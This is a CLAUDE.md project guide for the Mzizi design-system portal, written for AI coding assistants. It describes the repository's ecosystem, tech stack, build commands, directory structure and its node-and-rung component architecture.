# CLAUDE.md — Mzizi

> **An open-architecture project of the Bundu Foundation.**
> This file is the definitive reference for AI assistants working on this codebase.
> It also serves as the template for CLAUDE.md files across all bundu ecosystem repositories.

---

## 1. Project Identity

**Mzizi** is an **independent open-architecture project of the Bundu Foundation** — governed by the Bundu Foundation, operated and developed by Nyuchi. It is **not** a Nyuchi product. Mzizi owns the open DNA-helix frontend architecture, the component registry (`mzizi.dev/r/`), the Mzizi API (`mzizi.dev/api`), the components, the infrastructure harness, and the architecture nodes it serves.

It serves the full stable registry across the **Mzizi DNA double helix** — two entwined backbones (an **engineering** strand and a **meaning** strand) held by cross-cutting **rungs**, with no axes and no outliers. Nodes N1–N8 sit on strands (N2 primitives → N3 brand → N6 pages → N7 shell = the `shipped`/`core-guarantee` build; N1 tokens = `swappable`; N4 safety, N5 resilience, N8 assurance = `core-guarantee`); the rungs are N9 fundi (self-healing, owned by `mzizi-tools`), N10 documentation, and N11 discovery (SEO/AIO). The N-numbers are labels, not a sequence — see §6.2. **Mobile-first and multi-target** — Next.js/React still ships, but the direction is Rust across the stack, with Dioxus carrying web and mobile native from one codebase; Svelte stays supported but is no longer the destination, and Swift, Kotlin, ArkTS and React Native are first-class targets (§8.9). Each node records its own Rust position — implementation, alternative, or none — in `documentation-architecture-nodes` (§6.2). Built on the **Seven African Minerals** design system (seven minerals + seven heritage tones + status + the Experimental Seven — see §7). The React surface installs via the shadcn CLI; other targets differ (§8.9):

```
npx shadcn@latest add https://mzizi.dev/api/v1/ui/<component>
```

**Version:** 1.0.0

**Live at:** mzizi.dev

**Repository:** `github.com/nyuchi/design-portal`

**Governance:** Bundu Foundation. **Operated by:** Nyuchi — `github.com/nyuchi`

**Ecosystem context:** Mzizi is consumed across the bundu ecosystem — the Mukoko consumer family (mini-apps), Nyuchi enterprise products (delivered through the Console), and sister brands. It is the single source of truth for the design system, the component registry, the brand documentation, and the open DNA-helix frontend architecture. Mzizi's own long-form documentation lives **in this repo**, authored as MDX under `app/` (§15.17 — final). The sibling Starlight sites `docs.bundu.org` (bundu-docs) and `docs.nyuchi.com` (nyuchi-docs) continue to serve their own scopes.

---

## 2. Ecosystem Overview

Mzizi exists within a broader ecosystem. Understanding the relationships prevents duplicate work and keeps the doctrinal split (Mzizi / Mukoko / Nyuchi / Bundu) clean.

| Repository                    | Purpose                                                                                                                                    | Stack                                                   | Status                               |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------- | ------------------------------------ |
| **design-portal** (this repo) | Mzizi portal — component registry, brand, DNA-helix architecture, document-route MCP                                                       | Next.js 16, Tailwind 4, Radix UI, Supabase              | Canonical, active                    |
| **nyuchi/mzizi-tools**        | Mzizi tooling — `mzizi-mcp`, `mzizi-sdk` (contains the Fundi agent), `mzizi-skills`, `mzizi-console-app` (Svelte mini-app for the Console) | TypeScript, Cloudflare Workers, Svelte                  | Active (renamed from `nyuchi/fundi`) |
| **nyuchi/mukoko-platform**    | Nyuchi Console — B2B platform at `platform.nyuchi.com` (will be renamed `nyuchi-console`)                                                  | SvelteKit, Rust workers, WorkOS via identity.nyuchi.com | Active                               |
| **nyuchi/bundu-docs**         | Outward-facing product documentation — `docs.bundu.org`                                                                                    | Astro Starlight                                         | Active                               |
| **nyuchi/nyuchi-docs**        | Engineering / how-things-are-done docs — `docs.nyuchi.com`                                                                                 | Astro Starlight                                         | Active (mid-Wave-3 build)            |
| **nyuchi/mukoko-news**        | Pan-African news aggregator                                                                                                                | Next.js 15, Cloudflare Workers, Hono, D1                | Active                               |
| **nyuchi/mukoko-weather**     | AI weather intelligence platform                                                                                                           | Next.js 16, FastAPI, ScyllaDB, Claude AI                | Production                           |
| **nyuchi/mukoko**             | Super app (mini-apps + substrate components)                                                                                               | Next.js + Capacitor, Preact mini-apps, Turborepo        | Active                               |
| **nyuchi/nhimbe**             | Events platform                                                                                                                            | Next.js, TypeScript                                     | Active                               |
| **nyuchi/shamwari-ai**        | Sovereign AI companion                                                                                                                     | Python, Claude AI                                       | Active                               |
| `mintlify-docs`               | Retired Mintlify docs site                                                                                                                 | —                                                       | Retired (README has a redirect)      |

### Design system flow

```
design-portal (this repo)
    │
    ├── Defines: Seven African Minerals palette, typography, component API,
    │            DNA-helix frontend architecture, Ubuntu doctrine
    ├── Serves: the full stable registry across the DNA-helix nodes via the
    │           shadcn CLI / `/api/v1/*` (live count: GET /api/v1/stats)
    │           and the document-route MCP at /mcp (mzizi://components, mzizi://nodes)
    │
    └── Consumed by:
        ├── Mukoko consumer apps  (weather, news, nhimbe, super app, …)
        ├── Nyuchi enterprise products — surfaced inside the Console
        │   (each Mzizi mini-app ships as the `mzizi-console-app` npm package
        │    and plugs into platform.nyuchi.com)
        ├── Sister brands (Zimbabwe Information Platform, Barstool by Nyuchi)
        └── Any new bundu ecosystem app — via the shadcn CLI against /api/v1/ui/<component>
```

**Rule:** When building a new app, install components from this registry. Do not copy-paste component code or create parallel component libraries. Mzizi-side agentic tooling (the Fundi self-healing agent, MCP transport, console mini-app shell) lives in `nyuchi/mzizi-tools` — do not reintroduce it here. Mzizi's long-form docs are the opposite case: they belong **in this repo** as MDX (§15.17).

---

## 3. Tech Stack

| Layer                | Technology                                         | Version                                    |
| -------------------- | -------------------------------------------------- | ------------------------------------------ |
| Framework            | Next.js (App Router) + `@next/mdx`                 | 16.2.4                                     |
| Language             | TypeScript (strict mode)                           | 6.0.3                                      |
| Styling              | Tailwind CSS + CSS custom properties               | 4.2.4                                      |
| Component Primitives | Radix UI + Base UI                                 | radix-ui 1.4.3, @base-ui/react 1.4.1       |
| Variant Management   | class-variance-authority (CVA)                     | 0.7.1                                      |
| Class Composition    | clsx + tailwind-merge                              | via `cn()` in `lib/utils.ts`               |
| Icons                | Lucide React                                       | 1.8.0                                      |
| Theming              | next-themes                                        | 0.4.6                                      |
| Forms                | react-hook-form + zod                              | 7.73.1 / 4.3.6                             |
| Charts (canvas)      | Chart.js + react-chartjs-2                         | 4.5.1 / 5.3.1                              |
| Charts (SVG)         | Recharts                                           | 3.8.1                                      |
| Testing              | Vitest + Testing Library                           | 4.1.5                                      |
| Observability        | Structured logging (`lib/observability.ts`)        | Built-in                                   |
| Metrics              | MCP usage tracking (`lib/metrics.ts`)              | Built-in                                   |
| Site search          | Pagefind (built in `postbuild` step)               | 1.5.2, static index in `public/_pagefind/` |
| Database             | Supabase (PostgreSQL) — single source of truth     | @supabase/supabase-js 2.104.0              |
| Supabase request ctx | `@supabase/server` (`createSupabaseContext`, anon) | latest                                     |
| MCP Server           | @modelcontextprotocol/sdk (Streamable HTTP)        | 1.29.0                                     |
| CI/CD                | GitHub Actions + Vercel                            | —                                          |
| Deployment           | Vercel                                             | —                                          |

**Two charting stacks, and that is deliberate — do not "consolidate" them.**

- **Chart.js (canvas)** is the ecosystem's workhorse. Consumer apps lean on it far
  more than this repo's own file count suggests: mukoko-weather runs seven Chart.js
  sections on mobile. It is what you reach for when the dataset is large or the view
  is data-heavy, because a canvas draws one DOM node where SVG draws thousands.
  `canvas-chart` (N2) is the base; `time-series-chart` composes it.
- **Recharts (SVG)** backs the `chart-*` family — the shadcn chart blocks. SVG is the
  right default for small, interactive, styleable charts where per-element theming and
  accessibility matter more than node count.

This table used to list Recharts alone, which is how "the repo standardised on
recharts" ended up in a commit message. It had not; the two answer different questions.
`canvas-chart`'s own header states the rule — use it "when Recharts SVG would create
too many DOM nodes."

Both are real `dependencies`, not devDependencies: §14's upgrade-first policy makes this
repo the place major versions are exercised before any production app takes them, and a
dependency parked in `devDependencies` is one this repo never truly proves.

### Mzizi tooling — out-of-repo

The Mzizi agent + MCP + SDK + console mini-app shell are **not** in this repo. They live in `nyuchi/mzizi-tools` and are consumed as published npm packages:

| Package             | Purpose                                                                                                                                                |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `mzizi-mcp`         | Standalone Cloudflare Worker MCP transport (mirrors `/mcp` for non-portal consumers)                                                                   |
| `mzizi-sdk`         | TypeScript SDK + the **Fundi self-healing agent** (N9 fundi — a rung)                                                                                  |
| `mzizi-skills`      | Published skill bundle (`@nyuchi/mzizi-skills`) for AI assistants — the source of truth for skill content (§15.23); successor to `design-agent-skills` |
| `mzizi-console-app` | Svelte mini-app that surfaces Mzizi inside the Nyuchi Console (platform.nyuchi.com)                                                                    |

The portal still owns the `/mcp` HTTP endpoint (this repo's `app/mcp/route.ts`) — the standalone `mzizi-mcp` Worker is a deployment variant for consumers that don't want to go through `mzizi.dev`. Both surfaces read the same `component_documents` Supabase table.

---

## 4. Commands

```bash
pnpm dev              # Start dev server on PORT (default 11736)
pnpm build            # Production build (postbuild runs Pagefind to index .next/server/app)
pnpm start            # Start production server on PORT (default 11736)
pnpm lint             # ESLint
pnpm lint:fix         # ESLint with --fix
pnpm typecheck        # TypeScript type checking (tsc --noEmit)
pnpm test             # Run Vitest test suite once
pnpm test:watch       # Vitest in watch mode
pnpm registry:normalize # Rewrite registry.json in canonical form
pnpm registry:verify  # Non-mutating check — fails CI if registry.json is not canonical
pnpm tokens:sync      # Regenerate every N1 token artifact from the DB (§8.4.1)
pnpm tokens:verify    # Non-mutating check — fails CI if any token artifact drifted
pnpm registry:validate # Offline gate — every registry item resolves on disk and installs
pnpm doctrine:extract # Write content/doctrine/**/*.mdx from Supabase (§15.17)
pnpm doctrine:verify  # Non-mutating check — fails if an extracted doctrine file drifted
pnpm props:extract    # Read component prop types into lib/samples/props.generated.ts (§8.10)
pnpm props:verify     # Non-mutating check — fails if the extracted props are stale
pnpm samples:push     # Project lib/samples/data.ts into MongoDB `mzizi_samples` (§8.10)
pnpm browser:check    # Render pages through Kitesurf and assert they painted (§13.1)
pnpm audit:check      # pnpm audit --audit-level=moderate --ignore-registry-errors
```

The Rust half of the registry has its own toolchain (§8.9). It is not wrapped in pnpm scripts,
because a `pnpm rust:check` that shells out to cargo only adds a layer that can disagree with
what CI runs:

```bash
cargo fmt   --manifest-path mzizi-rs/Cargo.toml --all -- --check
cargo check --manifest-path mzizi-rs/Cargo.toml --workspace --all-targets
cargo clippy --manifest-path mzizi-rs/Cargo.toml --workspace --all-targets -- -D warnings
cargo test  --manifest-path mzizi-rs/Cargo.toml --workspace   # contract tests vs the .tsx
```

`pnpm components:extract` is **gone**, with `scripts/extract-components.ts` and the
`resolveComponentSource` disk-then-DB fallback. The migration those served is finished:
`source_code` is empty on all 571 rows, so all three could only read a column that no
longer holds anything. Source moves in one direction now, and that direction is "it is
already in git". See `docs/component-source-migration.md`.

**`pnpm registry:sync` is gone, and its direction is reversed.** `scripts/sync-registry.ts`
REGENERATED `registry.json` from the Supabase `components` view. Running it today would
delete the manifest's authored `meta` block — use cases, variants, sizes, features, a11y
notes, owner, collection — because no database row holds any of that any more. A generator
whose source has less information than its output does not regenerate, it truncates.

`scripts/normalize-registry.ts` replaces it and only canonicalises FORM: keys sorted, items
sorted by name, two-space indent, one trailing newline, so a diff shows what changed rather
than a reordering. `--check` (= `pnpm registry:verify`) fails when the committed file is not
canonical. It reads no database and needs no credentials.

Whether the manifest is CORRECT is a different question, asked by `pnpm registry:validate`
(`scripts/validate-registry.mjs`): every item resolves to a file on disk, every
`registryDependencies` entry is addressable by the shadcn CLI, every declared npm dependency
is installed here. Two scripts because they answer two questions — one asks "is the file
tidy", the other asks "does it work".

---

## 5. Directory Structure

```
design-portal/
├── .claude/
│   ├── settings.json                 # MCP server configuration for Claude Code
│   └── skills/                       # Author-time agent skills shipped with the repo
├── .github/
│   └── workflows/
│       ├── ci.yml                    # Lint, typecheck, test, build, audit
│       ├── claude-review.yml         # AI code review on PRs via Claude
│       └── release.yml               # Validate + create GitHub release on tags
├── .husky/
│   └── pre-commit                    # lint-staged → typecheck → audit
├── __tests__/                        # Vitest test suite
│   ├── playground-routes.test.ts     # /playground + /playground/[name] route surface
│   ├── api/
│   │   ├── architecture-routes.test.ts   # architecture route surface (live + 410)
│   │   ├── brand-route.test.ts       # /api/v1/brand response & headers
│   │   ├── registry-route.test.ts    # /api/v1/ui registry integrity
│   │   └── v1/                        # architecture-routes + docs-route (410) tests
│   └── components/                   # breadcrumbs, callout, dashboard-sidebar, toc render tests
├── app/                              # Next.js App Router
│   ├── globals.css                   # Theme tokens + Tailwind imports (token SOURCE OF TRUTH)
│   ├── layout.tsx                    # Root layout — Mzizi dashboard shell
│   ├── page.tsx                      # Landing page (server component, no MDX)
│   ├── error.tsx, global-error.tsx, not-found.tsx, loading.tsx
│   ├── icon.svg, apple-icon.svg, opengraph-image.tsx
│   ├── robots.ts                     # robots.txt generator
│   ├── sitemap.ts                    # sitemap.xml generator
│   ├── .well-known/security.txt/route.ts
│   ├── api/
│   │   ├── openapi/route.ts          # OpenAPI document
│   │   ├── chaos/[name]/route.ts     # L5/N5 chaos-injection endpoint (out-of-v1)
│   │   ├── health/[name]/route.ts    # Per-resource health probe (out-of-v1)
│   │   └── v1/                       # Mzizi API v1 (see §9)
│   │       ├── route.ts              # Discovery document
│   │       ├── ai/instructions/      # AI instruction sets (mcp-server / claude / copilot)
│   │       ├── architecture/         # /architecture (the helix), /architecture/nodes/[n];
│   │       │                         #   /architecture/{axes,layers/[n]} + /architecture/frontend/{axes,layers} = 410
│   │       ├── brand/                # Brand system
│   │       ├── changelog/            # Releases (root + [version])
│   │       ├── data-layer/, ecosystem/, pipeline/, sovereignty/
│   │       ├── docs/                 # HTTP 410 — MDX pages are routes, not an API (root + [slug])
│   │       ├── health/               # Health check
│   │       ├── search/               # Cross-resource search
│   │       ├── skills/               # Skills index + summary + [name]
│   │       ├── stats/                # Live counts + observability metrics
│   │       ├── ubuntu/               # /ubuntu/pillars, /ubuntu/principles
│   │       └── ui/                   # Registry: list, [name], [name]/docs, [name]/versions
│   ├── mcp/route.ts                  # MCP server HTTP endpoint (document-route)
│   ├── architecture/                 # DNA-helix architecture explorer (page.tsx + nodes/[n])
│   ├── components/                   # Component gallery (page.tsx + [name])
│   ├── source/[name]/                # Per-component source viewer
│   ├── playground/                   # Interactive component gallery (page.tsx + [name]) — wired #106
│   ├── tools/                        # Mzizi tools index + [name] detail — wired #107
│   ├── changelog/                    # /changelog + /changelog/[name] (per-component changelog) — wired #107
│   ├── observability/                # /observability open-data dashboard — wired #105
│   └── (app/ubuntu/                  # /ubuntu portal page — landing on v4.0.41 from PR #108)
├── components/
│   ├── docs/                         # `db-changelog.tsx` — DB-driven changelog renderer
│   ├── landing/                      # Portal-specific compositions over registry components
│   │                                 #   (header, footer, dashboard-sidebar, breadcrumbs, toc,
│   │                                 #   hero, install-steps, ai-native, build-with, explore,
│   │                                 #   resilient-by-design, architecture-canvas / explorer,
│   │                                 #   copy-command)
│   ├── layout/                       # mineral-strip.tsx, nyuchi-logo.tsx
│   ├── mdx/                          # MDX-author-facing components (Callout, …)
│   ├── mukoko/                       # Vendored registry:ui brand components
│   │                                 #   (mukoko-header, mukoko-footer, mukoko-theme-provider,
│   │                                 #   mukoko-skeleton-set, mukoko-error-set, mukoko-verified-badge)
│   ├── patterns/                     # Pattern demos (architecture, observability,
│   │                                 #   error-boundary, lazy-loading, component-pattern, code-block)
│   ├── playground/                   # Interactive component gallery + API tester
│   ├── ui/                           # Portal primitives — the only registry items committed
│   │                                 #   to disk. Post-rebrand additions: `node-badge.tsx`,
│   │                                 #   `status-badge.tsx`, `direction.tsx`, `typography.tsx`,
│   │                                 #   `spinner.tsx`, `kbd.tsx`, `user-menu.tsx`
│   ├── live-component-count.tsx      # Renders live count from /api/v1/stats
│   ├── live-mcp-stats.tsx            # Renders MCP usage stats
│   ├── error-boundary.tsx, lazy-section.tsx, section-error-boundary.tsx
│   ├── theme-provider.tsx, theme-toggle.tsx
│   └── example.tsx
├── hooks/
│   ├── use-mobile.ts                 # Mobile breakpoint (768px)
│   └── use-memory-pressure.ts        # Memory pressure observer
├── lib/
│   ├── utils.ts                      # cn() utility (clsx + tailwind-merge)
│   ├── icons.ts                      # Re-export shim for @/lib/icons (lucide-react passthrough)
│   ├── observability.ts              # Structured logging with [mzizi] prefix
│   ├── metrics.ts                    # MCP/API usage tracking
│   ├── mcp-server.ts                 # MCP server factory — `createMziziMcpServer()` (registry-backed)
│   ├── nav.ts                        # Shared nav data for header + sidebar (curated, not auto-gen)
│   ├── harness/                      # Vendored: NyuchiHarness + useNyuchiHarness hook
│   ├── resilience/                   # Vendored: section error boundary + retry fetch + fallback
│   ├── tokens/                       # Vendored: L1 design tokens + multi-platform generators
│   ├── motion/                       # Vendored: motion presets + reduced-motion detection
│   ├── a11y/                         # Vendored: focus-trap, live-region, skip-nav
│   ├── circuit-breaker.ts, retry.ts, timeout.ts, fallback-chain.ts,
│   ├── bulkhead.ts, rate-limiter.ts, chaos.ts    # Resilience primitives (vendored)
│   └── db/                           # Supabase data access — SOURCE OF TRUTH for components
│       ├── client.ts                 # Browser-side cache (localStorage)
│       ├── index.ts                  # Server-side query functions
│       └── types.ts                  # ComponentRow, ComponentDocRow, etc.
├── scripts/
│   ├── sync-registry.ts              # Generate registry.json + components/ui/* from Supabase
│   └── setup-github-labels.sh        # One-shot label provisioning
├── public/
│   ├── _pagefind/                    # Static search index (built by postbuild)
│   ├── icons/                        # Favicon assets
│   └── llms.txt                      # LLM-readable registry summary
├── mzizi-rs/                         # Cargo workspace — the Rust half of the registry (§8.9)
│   ├── Cargo.toml                    #   workspace: mzizi-tokens (N1), mzizi-ui (N2/Dioxus),
│   │                                 #              mzizi-assurance (N8), mzizi-fundi (N9)
│   └── crates/
│       ├── mzizi-tokens/src/lib.rs   #   #[path]-includes n1-tokens/nyuchi-tokens-rust.rs
│       ├── mzizi-ui/
│       │   ├── src/lib.rs            #   #[path]-includes n2-primitives/<name>.rs
│       │   └── tests/contract.rs     #   asserts each .rs agrees with its .tsx sibling
│       ├── mzizi-assurance/          #   N8 — every component, zero dependencies
│       │   ├── src/lib.rs            #   #[path]-includes n8-assurance/<name>.rs
│       │   └── tests/contract.rs     #   asserts each .rs agrees with its .ts/.tsx sibling
│       └── mzizi-fundi/              #   N9 — the reporter, the learning log, the engine
│           ├── src/lib.rs            #   #[path]-includes n9-fundi/<name>.rs
│           └── tests/contract.rs     #   same, plus the N8-to-N9 vocabulary check
├── supabase/
│   ├── schema.sql                    # Single-file schema snapshot
│   ├── config.toml
│   ├── seeds/
│   └── functions/
│       ├── _shared/                  # CORS + supabase helpers
│       └── analytics/                # Open-data analytics edge function
├── .claude-plugin/
│   └── plugin.json                   # Claude Code plugin marketplace manifest
├── registry.json                     # Generated snapshot of Supabase `components` (CI verifies drift)
├── openapi.yaml                      # OpenAPI 3.1 specification for /api/v1/
├── vitest.config.ts, vitest.setup.ts
├── components.json                   # shadcn CLI configuration
├── next.config.mjs, tsconfig.json, postcss.config.mjs, eslint.config.mjs, .prettierrc
└── package.json                      # v1.0.0 (the Next.js app at root)
```

> **Note on `registry.json`:** post-v4.0.26 the authoritative registry lives in the
> Supabase `components` table. `registry.json` is a committed snapshot so PRs show
> registry deltas clearly; `pnpm registry:verify` runs in CI to enforce the snapshot
> stays in sync. Only the primitives the portal itself imports are written into
> `components/ui/`; the rest of the stable registry is served only via `/api/v1/ui`.

---

## 6. Architecture

### 6.1 Registry System

**Single source of truth: the Supabase `components` table** — the stable registry across the nodes and rungs of the DNA double helix (live count: `GET /api/v1/stats`; never a fixed number — the node set is uncapped), with metadata, dependencies, docs and version history split across the tables below. **Source code is the exception and is not in any of them** — it is on disk, in git (§8.3).

| Table                                                  | Purpose                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `components`                                           | **A VIEW over `component_documents`, not a table.** It covers thirteen collections and filters to rows whose `kind` is null — the `documentation` collection also holds retired doc pages (`kind: doc_page` / `overview`), which must never be served as installable components. It listed only nine collections until the extraction, which is why `primitives` (228), `styling-libs` (16, all of N1), `documentation-engine` (4) and `accessibility-audit` were invisible to `/api/v1/ui/{name}` while remaining visible over MCP. **Component source is NOT here** — it is on disk under `components/registry/n<N>-<label>/` (§8.3), read only through `lib/registry-source.ts`. The `source_code` column survives the view definition but is null on every row, and nothing reads it: the disk-then-DB fallback that used to is deleted. |
| `component_documents`                                  | **Document-route staging table** (the spine of the new lean MCP). One self-contained JSON document per component (`{ owner, sources, legacy, files, … }`) keyed by node collection (`n1_tokens … n10_documentation`). The MCP at `/mcp` reads exclusively from here; the portal's `/api/v1/*` routes read from `components` and `component_docs`. The two surfaces are intentionally separate but stay in lock-step via a read-across pattern — `component_documents.legacy` mirrors the row in `components` so downstream consumers can pivot without duplicate fetches.                                                                                                                                                                                                                                                                    |
| `component_docs`                                       | Use cases, variants, a11y notes (per component) — served by `/api/v1/ui/{name}/docs`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `component_versions`                                   | Per-component version history — served by `/api/v1/ui/{name}/versions`. **Carries no `source_code` column, deliberately.** It used to: the view projected each archived version's `sourceCode` key, `getComponentVersions` did `select("*")`, and the route served ~10 MB of component source publicly across 2,728 rows — stale, since `button` came back 3,637 characters against 3,921 on disk. Component source has one home and it is git (§8.3). Closed at both layers: the query names its columns and the view no longer has the column at all.                                                                                                                                                                                                                                                                                      |
| `documentation_pages`                                  | **HISTORICAL — never write to it.** Long-form docs are now MDX in this repo (§15.17, final), so this table is neither the source nor the destination. The DB-driven renderers, the dynamic `[slug]` route, and the `get_documentation_page` MCP tool are all removed, and `/api/v1/docs/*` returns HTTP 410 — none of which this reversal asks back, because MDX pages are routes rather than an API surface. The table stays in Supabase as the historical source-of-record. Author `.mdx` under `app/`, not rows here.                                                                                                                                                                                                                                                                                                                     |
| `changelog`                                            | Releases — `nodes_affected` (uncapped), `tools_added/modified/deprecated/removed`, `components_added/modified/deprecated/removed`, `linked_issues`, `released_at`. Served at `/api/v1/changelog` and `/api/v1/changelog/{version}`; rendered into `/changelog` (#107).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `ai_instructions`                                      | System prompts per target (mcp-server, claude, copilot)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `skills`                                               | **RETIRED — no longer used.** Skills are files in `nyuchi/mzizi-tools` (`mzizi-skills/skills/<name>/SKILL.md`, npm `@nyuchi/mzizi-skills`) and are not projected into the database any more. `pnpm skills:sync` in that repo made three copies of every skill — the git file, this collection, and a standalone `skills` table — none of which anyone was allowed to edit, so the projection could only ever go stale. See §15.23.                                                                                                                                                                                                                                                                                                                                                                                                           |
| `brand_*`                                              | Minerals, semantic colors, typography, spacing, ecosystem brands                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `architecture_*`                                       | Principles, data layer, pipeline, sovereignty assessments, frontend axes/layers                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `ubuntu_pillars/principles`                            | Doctrine rows served at `/api/v1/ubuntu/{pillars,principles}` (and consumed by `app/ubuntu` once #108 lands)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `fundi_issues`, `observability_events`, `chaos_events` | Open-data event streams behind the `/observability` dashboard (#105) — public, schema.org `Dataset` JSON-LD                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

API responses follow the shadcn registry schema at `https://ui.shadcn.com/schema/registry.json`.

**Data flow:**

```
Supabase (source of truth)
     │
     ├── lib/db/index.ts (server-side queries)
     │     ├──► /api/v1/* (Next.js API routes — CORS + 1h cache)
     │     ├──► Server components (architecture / brand / changelog / observability pages)
     │     └──► /observability dashboard (live charts from usage_events + fundi_issues + chaos_events)
     │
     ├── pnpm tokens:sync ────► lib/tokens/palette.generated.ts, the globals.css
     │                          palette block, and the six N1 platform token files
     │                          (CI runs `pnpm tokens:verify` to fail on drift)
     │
     └── lib/db/client.ts (browser localStorage cache, fetched from /api/v1/ui)

git (source of truth for THE COMPONENT REGISTRY, end to end)
     │
     ├── registry.json                                  — the authored manifest:
     │                                                     install contract + `meta`
     │                                                     (use cases, variants, sizes,
     │                                                      features, a11y, owner,
     │                                                      collection, hasDemo)
     │
     └── components/registry/n<N>-<label>/<name>.<ext>  — the components themselves
         │
         └──► lib/registry.ts joins the two and is read by
              /api/v1/ui/{name}, app/mcp/route.ts, /source/[name],
              /components/[name] and /playground/[name]
```

**`registry.json` is AUTHORED, not generated.** It used to be a snapshot regenerated from
Supabase; it now carries the only copy of each component's documented contract, so editing a
description or a use case is a pull request against this file. `pnpm registry:normalize`
canonicalises its formatting and `pnpm registry:verify` fails CI when it is not canonical;
`pnpm registry:validate` is the gate that checks it actually installs.

**Required env vars:**

```
NEXT_PUBLIC_SUPABASE_URL       — Supabase project URL
NEXT_PUBLIC_SUPABASE_ANON_KEY  — public anon key (read-only via RLS)
SUPABASE_SERVICE_ROLE_KEY      — write access; server-only, never expose
SUPABASE_URL                   — (alias used by @supabase/server in /mcp)
SUPABASE_PUBLISHABLE_KEY       — (alias used by @supabase/server in /mcp)
```

Every route in the portal is public and anon-readable. There is no authenticated surface — the registry, brand, MCP, observability, and API routes are all open. The Fundi self-healing agent and its B2B auth surface live in `nyuchi/mzizi-tools` and the Nyuchi Console (`nyuchi/mukoko-platform`), not here.

### 6.2 Layered Component Architecture

Every component follows a layered pattern. This is mandatory for all bundu ecosystem apps consuming this registry.

The frontend architecture is the **Mzizi DNA double helix** — two entwined backbones (an **engineering** strand and a **meaning** strand) held together by cross-cutting **rungs**. Every element carries a `type`: a **node** (a functional unit sitting on a strand), a **strand** (a backbone grouping), or a **rung** (a base pair bridging both backbones). **There are no axes and no outliers.** Node identifiers **N1–N12 are labels, not a sequence** — N12 is simply the next id, not "on top of" N11. The live model is in `documentation-architecture-{nodes,strands}/*` and served by the MCP (`get_node_documents`, `get_architecture`); never hardcode counts.

**Nodes** (functional units, each on one strand):

| #   | sub_label    | Strand · backbone            | Covenant                                            |
| --- | ------------ | ---------------------------- | --------------------------------------------------- |
| 1   | `tokens`     | swappable · engineering      | Design decisions are data, not code.                |
| 2   | `primitive`  | core-guarantee · engineering | A primitive does one thing well.                    |
| 3   | `brand`      | shipped · engineering        | A brand component is a primitive with Ubuntu in it. |
| 4   | `safety`     | core-guarantee · engineering | Nothing harmful reaches the user.                   |
| 5   | `resilience` | core-guarantee · engineering | Failure in one part never breaks the whole.         |
| 6   | `pages`      | shipped · engineering        | A page is a composition, not an implementation.     |
| 7   | `shell`      | shipped · engineering        | The shell holds the product.                        |
| 8   | `assurance`  | core-guarantee · engineering | What breaks is seen before users feel it.           |

**Rungs** (cross-cutting base pairs — bridge both backbones, bound to no single strand):

| #   | sub_label       | Covenant                                                  |
| --- | --------------- | --------------------------------------------------------- |
| 9   | `fundi`         | Failure is a learning event — owned by `mzizi-tools`.     |
| 10  | `documentation` | The system documents itself in code — MDX in this repo.   |
| 11  | `discovery`     | If the machine can't see it, it doesn't exist.            |
| 12  | `skills`        | What the system knows how to do is teachable, not tribal. |

**N12 `skills` is a rung, and this file omitted it entirely** while the DB carried it — which is
how a rung stays invisible to every agent that reads doctrine here first. Its content is authored
in `nyuchi/mzizi-tools` (`mzizi-skills/skills/<name>/SKILL.md`, published as
`@nyuchi/mzizi-skills`); this repo neither authors nor stores it. It is a rung rather than a node
for the same reason N10 is: a skill bridges engineering practice and meaning at once, and no node
imports it.

**Each node's Rust position** — carried on the node document as a `rust` block (`position`, `kind`, `state`, `today`, `target`, `note`, `descriptors`) and reachable via `get_node_documents`. `position` answers a question `readiness` and `tier` cannot: does this node have a Rust **implementation** of its own, only a Rust **alternative** because it is UI, or **none**?

| #   | `rust.position` | `rust.kind`  | What that means                                                                               |
| --- | --------------- | ------------ | --------------------------------------------------------------------------------------------- |
| 1   | implementation  | toolchain    | Token generator becomes a Rust CLI emitting every target's token file                         |
| 2   | alternative     | ui-framework | Dioxus is the Rust path; primitives are framework-specific by nature                          |
| 3   | alternative     | ui-framework | Harness moves to the shared core; the component shell stays per-framework                     |
| 4   | implementation  | shared-core  | Gate logic to WASM + a native server binary — logic, not UI                                   |
| 5   | implementation  | shared-core  | Resilience state machine to WASM — logic, not UI                                              |
| 6   | alternative     | ui-framework | Nothing to implement: a page is a composition, which is why it ports cheaply                  |
| 7   | alternative     | ui-framework | Also the **mount point** — the shell instantiates the shared core once per app                |
| 8   | implementation  | shared-core  | Signal collection off the UI thread; same Rust aggregates server-side                         |
| 9   | implementation  | edge-worker  | `workers-rs` is the target; the deployed fundi worker is TypeScript                           |
| 10  | **none**        | —            | Docs are MDX and the build is the guarantee — no Rust role, stated deliberately               |
| 11  | **constraint**  | —            | No implementation; a WASM web target **must** prerender or crawlers get an empty page         |
| 12  | **none**        | —            | A skill is a document read at inference time — no runtime to compile, so nothing to implement |

Three rules fall out of this table and are the ones that get broken:

- **Only nodes holding _logic_ get a Rust implementation** (N1, N4, N5, N8, N9). Every UI node gets an _alternative_ — a Dioxus `Button` and a Svelte `Button` share a contract and a token set, not a source file.
- **A node with no Rust role is a better answer than a fabricated one.** N10 is the worked example: its guarantee comes from documentation passing through the build, not from the build's language. Do not invent a Rust story to fill the column.
- **N7 is where the two Rusts meet.** Rust-as-UI replaces the shell; Rust-as-shared-core is what the shell _loads_. Initialise the core per component instead of per app and every component gets its own circuit breaker — which is not a circuit breaker.

